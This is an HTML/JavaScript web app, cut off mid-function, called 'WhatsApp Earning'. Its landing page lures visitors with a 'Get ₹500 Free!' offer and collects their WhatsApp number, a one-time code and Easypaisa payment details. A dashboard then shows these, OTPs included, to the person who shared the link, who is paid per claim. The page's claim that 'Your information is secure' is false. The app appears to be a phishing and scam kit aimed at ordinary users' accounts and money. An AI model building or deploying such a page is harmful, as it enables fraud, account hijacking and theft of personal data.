<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>WhatsApp Earning - Earn Money</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  
  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      color: #333;
    }

    /* Auth Container */
    .auth-container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .auth-card {
      background: white;
      border-radius: 20px;
      padding: 40px;
      width: 100%;
      max-width: 450px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      animation: slideUp 0.5s ease;
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .auth-header {
      text-align: center;
      margin-bottom: 30px;
    }

    .auth-header h2 {
      font-size: 28px;
      color: #667eea;
      margin-bottom: 10px;
    }

    .auth-header p {
      color: #666;
      font-size: 14px;
    }

    .input-group {
      margin-bottom: 20px;
      position: relative;
    }

    .input-group i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #667eea;
      font-size: 18px;
      z-index: 1;
    }

    .input-group input, .input-group select {
      width: 100%;
      padding: 15px 15px 15px 45px;
      border: 2px solid #e0e0e0;
      border-radius: 10px;
      font-size: 14px;
      font-family: inherit;
      transition: all 0.3s ease;
    }

    .input-group input:focus, .input-group select:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }

    .btn {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .btn-primary {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }

    .btn-primary:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
    }

    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .btn-success {
      background: linear-gradient(135deg, #28a745 0%, #218838 100%);
      color: white;
      margin-bottom: 15px;
    }

    .btn-success:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 10px 30px rgba(40, 167, 69, 0.4);
    }

    .btn-outline {
      background: transparent;
      border: 2px solid #667eea;
      color: #667eea;
    }

    .btn-outline:hover:not(:disabled) {
      background: #667eea;
      color: white;
    }

    .btn-danger {
      background: #ff4757;
      color: white;
      border: none;
      padding: 8px 20px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      transition: all 0.3s ease;
    }

    .btn-danger:hover {
      background: #ff3344;
      transform: translateY(-2px);
    }

    .btn-small {
      padding: 8px 15px;
      font-size: 14px;
      width: auto;
      margin: 0 0 0 10px;
    }

    .auth-switch {
      text-align: center;
      margin-top: 20px;
      color: #666;
    }

    .auth-switch a {
      color: #667eea;
      text-decoration: none;
      font-weight: 600;
      cursor: pointer;
    }

    .error-message {
      background: #ffebee;
      color: #c62828;
      padding: 10px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .success-message {
      background: #d4edda;
      color: #155724;
      padding: 10px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    /* Main App Container */
    .app-container {
      min-height: 100vh;
      background: #f5f5f5;
      display: none;
    }

    /* Navbar */
    .navbar {
      background: white;
      padding: 15px 30px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
    }

    .nav-brand {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .nav-brand i {
      font-size: 24px;
      color: #667eea;
    }

    .nav-brand h2 {
      font-size: 20px;
      color: #333;
    }

    .nav-brand span {
      color: #667eea;
    }

    .nav-user {
      display: flex;
      align-items: center;
      gap: 20px;
    }

    .user-email {
      color: #666;
      font-size: 14px;
    }

    /* Main Content */
    .main-content {
      max-width: 1200px;
      margin: 30px auto;
      padding: 0 20px;
    }

    /* Stats Cards */
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-bottom: 30px;
    }

    .stat-card {
      background: white;
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.05);
      display: flex;
      align-items: center;
      gap: 20px;
      transition: all 0.3s ease;
    }

    .stat-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
    }

    .stat-icon {
      width: 60px;
      height: 60px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .stat-icon i {
      font-size: 28px;
      color: white;
    }

    .stat-info h3 {
      font-size: 14px;
      color: #666;
      margin-bottom: 5px;
    }

    .stat-info p {
      font-size: 24px;
      font-weight: 700;
      color: #333;
    }

    /* Link Generator Card */
    .link-generator-card {
      background: white;
      border-radius: 20px;
      padding: 30px;
      margin-bottom: 30px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.05);
    }

    .card-title {
      font-size: 20px;
      color: #333;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .card-title i {
      color: #667eea;
    }

    .link-generator {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
    }

    .link-generator input {
      flex: 1;
      padding: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 10px;
      font-size: 14px;
      min-width: 250px;
    }

    .link-generator input:read-only {
      background: #f8f8f8;
      color: #666;
    }

    /* Offers Table */
    .offers-section {
      background: white;
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.05);
    }

    .section-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
      flex-wrap: wrap;
      gap: 15px;
    }

    .section-header h3 {
      font-size: 18px;
      color: #333;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .filter-tabs {
      display: flex;
      gap: 10px;
    }

    .filter-tab {
      padding: 8px 20px;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      background: white;
      color: #666;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .filter-tab.active {
      background: #667eea;
      border-color: #667eea;
      color: white;
    }

    .otp-status {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 600;
      margin-left: 5px;
    }

    .otp-sent {
      background: #cce5ff;
      color: #004085;
    }

    .otp-verified {
      background: #d4edda;
      color: #155724;
    }

    .otp-pending {
      background: #fff3cd;
      color: #856404;
    }

    .offers-table {
      overflow-x: auto;
    }

    table {
      width: 100%;
      border-collapse: collapse;
    }

    th {
      text-align: left;
      padding: 15px;
      background: #f8f8f8;
      color: #333;
      font-weight: 600;
      font-size: 14px;
    }

    td {
      padding: 15px;
      border-bottom: 1px solid #e0e0e0;
      color: #666;
      font-size: 14px;
    }

    .status-badge {
      padding: 5px 10px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      display: inline-block;
    }

    .status-pending {
      background: #fff3cd;
      color: #856404;
    }

    .status-completed {
      background: #d4edda;
      color: #155724;
    }

    .status-otp-sent {
      background: #cce5ff;
      color: #004085;
    }

    .no-data {
      text-align: center;
      padding: 40px;
      color: #999;
    }

    /* Loading Spinner */
    .loading-spinner {
      text-align: center;
      padding: 20px;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Toast Notification */
    .toast {
      position: fixed;
      bottom: 30px;
      right: 30px;
      background: white;
      padding: 15px 25px;
      border-radius: 10px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
      display: flex;
      align-items: center;
      gap: 10px;
      transform: translateX(400px);
      transition: all 0.3s ease;
      z-index: 1000;
    }

    .toast.show {
      transform: translateX(0);
    }

    .toast.success {
      border-left: 4px solid #4caf50;
    }

    .toast.error {
      border-left: 4px solid #f44336;
    }

    .toast.info {
      border-left: 4px solid #2196f3;
    }

    /* Offer Landing Page */
    .offer-container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    }

    .offer-card {
      background: white;
      border-radius: 20px;
      padding: 40px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      animation: slideUp 0.5s ease;
    }

    .flex-row {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .flex-row .input-group {
      flex: 1;
      margin-bottom: 0;
    }

    .otp-section {
      background: #f8f9fa;
      border-radius: 10px;
      padding: 20px;
      margin: 20px 0;
      border: 2px solid #e0e0e0;
    }

    .otp-section h4 {
      margin-bottom: 15px;
      color: #667eea;
      font-size: 16px;
    }

    .otp-timer {
      font-size: 13px;
      color: #666;
      margin-top: 10px;
      text-align: center;
    }

    .hidden {
      display: none !important;
    }

    @media (max-width: 768px) {
      .navbar {
        padding: 15px 20px;
      }
      
      .nav-user {
        width: 100%;
        justify-content: space-between;
        margin-top: 10px;
      }
      
      .link-generator {
        flex-direction: column;
      }
      
      .toast {
        left: 20px;
        right: 20px;
        bottom: 20px;
      }

      .flex-row {
        flex-direction: column;
      }

      .btn-small {
        margin: 10px 0 0 0;
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <!-- Auth Container -->
  <div class="auth-container" id="authContainer">
    <div class="auth-card" id="loginForm">
      <div class="auth-header">
        <h2>Welcome Back! ðŸ‘‹</h2>
        <p>Login to continue earning</p>
      </div>
      
      <div id="loginError" class="error-message" style="display: none;">
        <i class="fas fa-exclamation-circle"></i>
        <span></span>
      </div>
      
      <div class="input-group">
        <i class="fas fa-envelope"></i>
        <input type="email" id="loginEmail" placeholder="Email Address">
      </div>
      
      <div class="input-group">
        <i class="fas fa-lock"></i>
        <input type="password" id="loginPassword" placeholder="Password">
      </div>
      
      <button class="btn btn-primary" onclick="login()" id="loginBtn">
        <i class="fas fa-sign-in-alt"></i>
        Login
      </button>
      
      <div class="auth-switch">
        Don't have an account? <a onclick="showSignup()">Sign Up</a>
      </div>
    </div>
    
    <div class="auth-card" id="signupForm" style="display: none;">
      <div class="auth-header">
        <h2>Create Account ðŸš€</h2>
        <p>Start earning with WhatsApp</p>
      </div>
      
      <div id="signupError" class="error-message" style="display: none;">
        <i class="fas fa-exclamation-circle"></i>
        <span></span>
      </div>
      
      <div class="input-group">
        <i class="fas fa-user"></i>
        <input type="text" id="signupName" placeholder="Full Name">
      </div>
      
      <div class="input-group">
        <i class="fas fa-envelope"></i>
        <input type="email" id="signupEmail" placeholder="Email Address">
      </div>
      
      <div class="input-group">
        <i class="fas fa-lock"></i>
        <input type="password" id="signupPassword" placeholder="Password (min. 6 characters)">
      </div>
      
      <button class="btn btn-primary" onclick="signup()" id="signupBtn">
        <i class="fas fa-user-plus"></i>
        Sign Up
      </button>
      
      <div class="auth-switch">
        Already have an account? <a onclick="showLogin()">Login</a>
      </div>
    </div>
  </div>

  <!-- Main App Container -->
  <div class="app-container" id="appContainer">
    <nav class="navbar">
      <div class="nav-brand">
        <i class="fab fa-whatsapp"></i>
        <h2>WhatsApp <span>Earning</span></h2>
      </div>
      <div class="nav-user">
        <span class="user-email" id="userEmail">loading...</span>
        <button class="btn-danger" onclick="logout()">
          <i class="fas fa-sign-out-alt"></i> Logout
        </button>
      </div>
    </nav>

    <div class="main-content">
      <!-- Stats Cards -->
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-icon">
            <i class="fas fa-link"></i>
          </div>
          <div class="stat-info">
            <h3>Total Links</h3>
            <p id="totalLinks">0</p>
          </div>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon">
            <i class="fas fa-users"></i>
          </div>
          <div class="stat-info">
            <h3>Total Visits</h3>
            <p id="totalVisits">0</p>
          </div>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon">
            <i class="fas fa-rupee-sign"></i>
          </div>
          <div class="stat-info">
            <h3>Total Earnings</h3>
            <p id="totalEarnings">â‚¹0</p>
          </div>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon">
            <i class="fas fa-clock"></i>
          </div>
          <div class="stat-info">
            <h3>Pending</h3>
            <p id="pendingCount">0</p>
          </div>
        </div>
      </div>

      <!-- Link Generator Card -->
      <div class="link-generator-card">
        <h3 class="card-title">
          <i class="fas fa-magic"></i>
          Generate Your Earning Link
        </h3>
        
        <div class="link-generator">
          <input type="text" id="generatedLink" readonly placeholder="Click generate to create link" value="">
          <button class="btn btn-primary" onclick="generateLink()" id="generateBtn">
            <i class="fas fa-link"></i>
            Generate Link
          </button>
          <button class="btn btn-outline" onclick="copyLink()" id="copyBtn">
            <i class="fas fa-copy"></i>
            Copy
          </button>
        </div>
        
        <div style="margin-top: 15px; font-size: 13px; color: #999;">
          <i class="fas fa-info-circle"></i>
          Share this link on WhatsApp. When someone claims offer, you'll earn â‚¹50 per claim.
        </div>
      </div>

      <!-- Offers Section -->
      <div class="offers-section">
        <div class="section-header">
          <h3>
            <i class="fas fa-list"></i>
            Recent Offers
          </h3>
          <div class="filter-tabs">
            <button class="filter-tab active" onclick="filterOffers('all', this)">All</button>
            <button class="filter-tab" onclick="filterOffers('pending', this)">Pending</button>
            <button class="filter-tab" onclick="filterOffers('completed', this)">Completed</button>
            <button class="filter-tab" onclick="filterOffers('otp_sent', this)">OTP Sent</button>
          </div>
        </div>

        <div class="offers-table">
          <table id="offersTable">
            <thead>
              <tr>
                <th>WhatsApp Number</th>
                <th>OTP Status</th>
                <th>Easypaisa Number</th>
                <th>Easypaisa Name</th>
                <th>Amount</th>
                <th>Status</th>
                <th>Date</th>
              </tr>
            </thead>
            <tbody id="offersBody">
              <tr>
                <td colspan="7" class="no-data">
                  <div class="loading-spinner">
                    <div class="spinner"></div>
                    <p style="margin-top:10px;">Loading offers...</p>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>

  <!-- Toast Notification -->
  <div class="toast" id="toast">
    <i class="fas fa-check-circle"></i>
    <span>Notification message</span>
  </div>

  <script>
    // Your Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyAAjSA6kyXbG_q7SxvoyUDdKSA0GzchbW8",
      authDomain: "whateapp-854d5.firebaseapp.com",
      databaseURL: "https://whateapp-854d5-default-rtdb.firebaseio.com",
      projectId: "whateapp-854d5",
      storageBucket: "whateapp-854d5.firebasestorage.app",
      messagingSenderId: "207401851380",
      appId: "1:207401851380:web:dcd72db49350bfb55341a1"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();

    // Enable offline persistence
    db.enablePersistence()
      .catch((err) => {
        if (err.code == 'failed-precondition') {
          console.log('Persistence failed - multiple tabs open');
        } else if (err.code == 'unimplemented') {
          console.log('Persistence not available');
        }
      });

    // Global variables
    let currentUser = null;
    let currentFilter = 'all';
    let currentOffers = [];

    // Check auth state
    firebase.auth().onAuthStateChanged((user) => {
      if (user) {
        currentUser = user;
        showApp();
        loadUserData();
        loadOffers();
      } else {
        showAuth();
      }
    });

    // Show/Hide functions
    function showApp() {
      document.getElementById('authContainer').style.display = 'none';
      document.getElementById('appContainer').style.display = 'block';
      document.getElementById('userEmail').textContent = currentUser?.email || 'User';
    }

    function showAuth() {
      document.getElementById('authContainer').style.display = 'flex';
      document.getElementById('appContainer').style.display = 'none';
    }

    // Auth functions
    window.showLogin = function() {
      document.getElementById('loginForm').style.display = 'block';
      document.getElementById('signupForm').style.display = 'none';
      clearErrors();
    };

    window.showSignup = function() {
      document.getElementById('loginForm').style.display = 'none';
      document.getElementById('signupForm').style.display = 'block';
      clearErrors();
    };

    function clearErrors() {
      document.getElementById('loginError').style.display = 'none';
      document.getElementById('signupError').style.display = 'none';
    }

    function showError(elementId, message) {
      const errorDiv = document.getElementById(elementId);
      errorDiv.querySelector('span').textContent = message;
      errorDiv.style.display = 'flex';
    }

    // Login function
    window.login = async function() {
      const email = document.getElementById('loginEmail').value;
      const password = document.getElementById('loginPassword').value;
      const loginBtn = document.getElementById('loginBtn');

      if (!email || !password) {
        showError('loginError', 'Please fill all fields');
        return;
      }

      try {
        loginBtn.disabled = true;
        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
        
        await firebase.auth().signInWithEmailAndPassword(email, password);
        showToast('Login successful!', 'success');
      } catch (error) {
        loginBtn.disabled = false;
        loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Login';
        showError('loginError', error.message);
      }
    };

    // Signup function
    window.signup = async function() {
      const name = document.getElementById('signupName').value;
      const email = document.getElementById('signupEmail').value;
      const password = document.getElementById('signupPassword').value;
      const signupBtn = document.getElementById('signupBtn');

      if (!name || !email || !password) {
        showError('signupError', 'Please fill all fields');
        return;
      }

      if (password.length < 6) {
        showError('signupError', 'Password must be at least 6 characters');
        return;
      }

      try {
        signupBtn.disabled = true;
        signupBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating account...';
        
        const userCredential = await firebase.auth().createUserWithEmailAndPassword(email, password);
        
        // Create user profile in Firestore
        await db.collection('users').add({
          uid: userCredential.user.uid,
          name: name,
          email: email,
          createdAt: firebase.firestore.FieldValue.serverTimestamp(),
          totalLinks: 0,
          totalVisits: 0,
          totalEarnings: 0
        });

        showToast('Account created successfully!', 'success');
      } catch (error) {
        signupBtn.disabled = false;
        signupBtn.innerHTML = '<i class="fas fa-user-plus"></i> Sign Up';
        showError('signupError', error.message);
      }
    };

    // Logout function
    window.logout = async function() {
      try {
        await firebase.auth().signOut();
        showToast('Logged out successfully', 'success');
      } catch (error) {
        showToast(error.message, 'error');
      }
    };

    // Load user data
    async function loadUserData() {
      if (!currentUser) return;

      try {
        // Get user stats
        const querySnapshot = await db.collection('users')
          .where('uid', '==', currentUser.uid)
          .get();
        
        if (!querySnapshot.empty) {
          const userData = querySnapshot.docs[0].data();
          document.getElementById('totalLinks').textContent = userData.totalLinks || 0;
          document.getElementById('totalVisits').textContent = userData.totalVisits || 0;
          document.getElementById('totalEarnings').textContent = `â‚¹${userData.totalEarnings || 0}`;
        }

      } catch (error) {
        console.error('Error loading user data:', error);
        showToast('Error loading data', 'error');
      }
    }

    // Generate link
    window.generateLink = async function() {
      if (!currentUser) return;

      const generateBtn = document.getElementById('generateBtn');
      const linkInput = document.getElementById('generatedLink');

      try {
        generateBtn.disabled = true;
        generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';

        const linkId = generateLinkId();
        const linkUrl = `${window.location.origin}?ref=${linkId}`;
        
        // Save link to Firestore
        await db.collection('links').add({
          userId: currentUser.uid,
          linkId: linkId,
          url: linkUrl,
          visits: 0,
          earnings: 0,
          createdAt: firebase.firestore.FieldValue.serverTimestamp(),
          active: true
        });

        // Update user's total links
        const userSnapshot = await db.collection('users')
          .where('uid', '==', currentUser.uid)
          .get();
        
        if (!userSnapshot.empty) {
          const userDoc = userSnapshot.docs[0];
          await userDoc.ref.update({
            totalLinks: firebase.firestore.FieldValue.increment(1)
          });
        }

        linkInput.value = linkUrl;
        showToast('Link generated successfully!', 'success');
        
        // Reload user data
        loadUserData();

      } catch (error) {
        console.error('Error generating link:', error);
        showToast('Error generating link', 'error');
      } finally {
        generateBtn.disabled = false;
        generateBtn.innerHTML = '<i class="fas fa-link"></i> Generate Link';
      }
    };

    // Generate unique link ID
    function generateLinkId() {
      return 'WE' + Math.random().toString(36).substring(2, 10).toUpperCase();
    }

    // Copy link to clipboard
    window.copyLink = function() {
      const linkInput = document.getElementById('generatedLink');
      if (!linkInput.value) {
        showToast('Generate a link first', 'error');
        return;
      }

      linkInput.select();
      document.execCommand('copy');
      showToast('Link copied to clipboard!', 'success');
    };

    // ===========================================
    // FIXED: Load offers WITHOUT orderBy
    // ===========================================
    async function loadOffers() {
      if (!currentUser) return;

      try {
        console.log('Loading offers for user:', currentUser.uid);
        
        // WITHOUT orderBy - no index needed
        const querySnapshot = await db.collection('offers')
          .where('referrerId', '==', currentUser.uid)
          .get();
        
        console.log('Offers found:', querySnapshot.size);
        
        currentOffers = [];
        querySnapshot.forEach(doc => {
          const data = doc.data();
          console.log('Offer data:', data);
          currentOffers.push({
            id: doc.id,
            ...data
          });
        });

        // Manual sorting by date (newest first)
        currentOffers.sort((a, b) => {
          // Handle missing dates
          if (!a.createdAt) return 1;
          if (!b.createdAt) return -1;
          
          try {
            // Convert Firestore Timestamp to Date
            const dateA = a.createdAt.toDate ? a.createdAt.toDate() : new Date(a.createdAt);
            const dateB = b.createdAt.toDate ? b.createdAt.toDate() : new Date(b.createdAt);
            
            return dateB - dateA; // Descending order (newest first)
          } catch (e) {
            console.error('Date comparison error:', e);
            return 0;
          }
        });

        updatePendingCount();
        renderOffers();

      } catch (error) {
        console.error('Error loading offers:', error);
        console.error('Error code:', error.code);
        console.error('Error message:', error.message);
        
        showToast('Error loading offers', 'error');
        
        // Show empty state with error
        document.getElementById('offersBody').innerHTML = `
          <tr>
            <td colspan="7" class="no-data">
              <i class="fas fa-exclamation-triangle" style="font-size:40px; color:#f39c12; margin-bottom:10px;"></i>
              <p>No offers yet. Share your link to start earning!</p>
            </td>
          </tr>
        `;
      }
    }

    // Update pending count
    function updatePendingCount() {
      const pending = currentOffers.filter(offer => offer.status === 'pending').length;
      document.getElementById('pendingCount').textContent = pending;
    }

    // Render offers based on filter
    function renderOffers() {
      const tbody = document.getElementById('offersBody');
      
      if (currentOffers.length === 0) {
        tbody.innerHTML = `
          <tr>
            <td colspan="7" class="no-data">
              <i class="fas fa-inbox" style="font-size:40px; margin-bottom:10px;"></i>
              <p>No offers yet. Share your link to start earning!</p>
            </td>
          </tr>
        `;
        return;
      }

      let filteredOffers = currentOffers;
      if (currentFilter !== 'all') {
        filteredOffers = currentOffers.filter(offer => offer.status === currentFilter);
      }

      if (filteredOffers.length === 0) {
        tbody.innerHTML = `
          <tr>
            <td colspan="7" class="no-data">
              <p>No ${currentFilter} offers found</p>
            </td>
          </tr>
        `;
        return;
      }

      tbody.innerHTML = filteredOffers.map(offer => {
        let date = 'N/A';
        try {
          if (offer.createdAt) {
            if (offer.createdAt.toDate) {
              date = offer.createdAt.toDate().toLocaleDateString();
            } else if (offer.createdAt instanceof Date) {
              date = offer.createdAt.toLocaleDateString();
            } else if (typeof offer.createdAt === 'string') {
              date = new Date(offer.createdAt).toLocaleDateString();
            }
          }
        } catch (e) {
          console.error('Date formatting error:', e);
        }
        
        let otpStatusText = 'Not Sent';
        let otpStatusClass = 'otp-pending';
        
        if (offer.otpStatus === 'sent') {
          otpStatusText = 'OTP Sent';
          otpStatusClass = 'otp-sent';
        } else if (offer.otpStatus === 'verified') {
          otpStatusText = 'OTP Verified';
          otpStatusClass = 'otp-verified';
        }
        
        return `
          <tr>
            <td>${offer.whatsappNumber || 'N/A'}</td>
            <td>
              <span class="otp-status ${otpStatusClass}">${otpStatusText}</span>
              ${offer.otp ? `<br><small>OTP: ${offer.otp}</small>` : ''}
            </td>
            <td>${offer.easypaisaNumber || 'N/A'}</td>
            <td>${offer.easypaisaName || 'N/A'}</td>
            <td>â‚¹${offer.amount || 500}</td>
            <td>
              <span class="status-badge ${offer.status === 'pending' ? 'status-pending' : 'status-completed'}">
                ${offer.status || 'pending'}
              </span>
            </td>
            <td>${date}</td>
          </tr>
        `;
      }).join('');
    }

    // Filter offers
    window.filterOffers = function(filter, element) {
      currentFilter = filter;
      
      // Update active tab
      document.querySelectorAll('.filter-tab').forEach(tab => {
        tab.classList.remove('active');
      });
      element.classList.add('active');
      
      renderOffers();
    };

    // Check for referral in URL
    function checkReferral() {
      const urlParams = new URLSearchParams(window.location.search);
      const refId = urlParams.get('ref');
      
      if (refId && !currentUser) {
        showOfferLanding(refId);
      }
    }

    // Show offer landing page
    async function showOfferLanding(linkId) {
      document.body.innerHTML = `
        <div class="offer-container">
          <div class="offer-card">
            <div style="text-align:center; margin-bottom:30px;">
              <i class="fas fa-gift" style="font-size:50px; color:#667eea; margin-bottom:15px;"></i>
              <h2 style="color:#333; margin-bottom:10px;">Get â‚¹500 Free!</h2>
              <p style="color:#666;">Complete the form below to claim your reward</p>
            </div>
            
            <div id="offerError" class="error-message" style="display: none;"></div>
            <div id="offerSuccess" class="success-message" style="display: none;"></div>
            
            <!-- Step 1: WhatsApp Number and Send OTP -->
            <div id="step1">
              <div class="input-group">
                <i class="fab fa-whatsapp"></i>
                <input type="tel" id="offerWhatsapp" placeholder="WhatsApp Number (e.g., 923001234567)" pattern="[0-9]+">
              </div>
              
              <button class="btn btn-success" onclick="sendOTP('${linkId}')" id="sendOtpBtn">
                <i class="fas fa-paper-plane"></i>
                Send OTP
              </button>
            </div>
            
            <!-- Step 2: OTP Verification and Details Form (Hidden initially) -->
            <div id="step2" style="display: none;">
              <div class="otp-section">
                <h4><i class="fas fa-key"></i> OTP Verification</h4>
                
                <div class="flex-row">
                  <div class="input-group">
                    <i class="fas fa-key"></i>
                    <input type="text" id="offerOtp" placeholder="Enter 6-digit OTP">
                  </div>
                  <button class="btn btn-small btn-primary" onclick="verifyOTP('${linkId}')" id="verifyOtpBtn">
                    Verify
                  </button>
                </div>
                
                <div class="otp-timer" id="otpTimer"></div>
              </div>
              
              <div class="input-group">
                <i class="fas fa-mobile-alt"></i>
                <input type="tel" id="offerEasypaisa" placeholder="Easypaisa Number">
              </div>
              
              <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" id="offerName" placeholder="Easypaisa Account Name">
              </div>
              
              <div class="input-group">
                <i class="fas fa-rupee-sign"></i>
                <input type="text" id="offerAmount" value="500" readonly style="background:#f8f8f8;">
              </div>
              
              <button class="btn btn-primary" onclick="submitOffer('${linkId}')" id="claimBtn">
                <i class="fas fa-check-circle"></i>
                Claim â‚¹500 Now
              </button>
            </div>
            
            <p style="text-align:center; font-size:12px; color:#999; margin-top:15px;">
              <i class="fas fa-shield-alt"></i>
              Your information is secure
            </p>
          </div>
        </div>
      `;
    }

    // Send OTP function
    window.sendOTP = async function(linkId) {
      const whatsapp = document.getElementById('offerWhatsapp')?.value;
      const sendOtpBtn = document.getElementById('sendOtpBtn');

      if (!whatsapp) {
        showOfferError('Please enter WhatsApp number');
        return;
      }

      if (whatsapp.length < 10 || whatsapp.length > 15) {
        showOfferError('Please enter a valid WhatsApp number (10-15 digits)');
        return;
      }

      try {
        sendOtpBtn.disabled = true;
        sendOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending OTP...';

        // Generate random 6-digit OTP
        const otp = Math.floor(100000 + Math.random() * 900000).toString();

        // Find the link
        const linksSnapshot = await db.collection('links')
          .where('linkId', '==', linkId)
          .get();

        if (linksSnapshot.empty) {
          showOfferError('Invalid link');
          sendOtpBtn.disabled = false;
          sendOtpBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send OTP';
          return;
        }

        const linkDoc = linksSnapshot.docs[0];
        const linkData = linkDoc.data();

        // Save OTP request to Firestore
        await db.collection('otp_requests').add({
          referrerId: linkData.userId,
          linkId: linkId,
          whatsappNumber: whatsapp,
          otp: otp,
          status: 'sent',
          createdAt: firebase.firestore.FieldValue.serverTimestamp(),
          expiresAt: new Date(Date.now() + 5 * 60000) // 5 minutes expiry
        });

        // Show success message
        document.getElementById('offerSuccess').style.display = 'flex';
        document.getElementById('offerSuccess').innerHTML = `<i class="fas fa-check-circle"></i> OTP sent to ${whatsapp}`;
        
        // Hide step 1, show step 2
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        
        // Start OTP timer
        startOTPTimer(5);

        // For demo purposes, show OTP in console (in production, you'd send via SMS API)
        console.log('OTP for testing:', otp);
        showToast(`Demo OTP: ${otp}`, 'info');

      } catch (error) {
        console.error('Error sending OTP:', error);
        showOfferError('Error sending OTP. Please try again.');
        sendOtpBtn.disabled = false;
        sendOtpBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send OTP';
      }
    };

    // Start OTP timer
    function startOTPTimer(minutes) {
      let timeLeft = minutes * 60;
      const timerElement = document.getElementById('otpTimer');
      
      const timer = setInterval(() => {
        const mins = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        timerElement.textContent = `OTP expires in: ${mins}:${secs.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
          clearInterval(timer);
          timerElement.textContent = 'OTP expired. Please request again.';
        }
        timeLeft--;
      }, 1000);
    }

    // Verify OTP function
    window.verifyOTP = async function(linkId) {
      const otp = document.getElementById('offerOtp')?.value;
      const whatsapp = document.getElementById('offerWhatsapp')?.value;

      if (!otp || otp.length !== 6) {
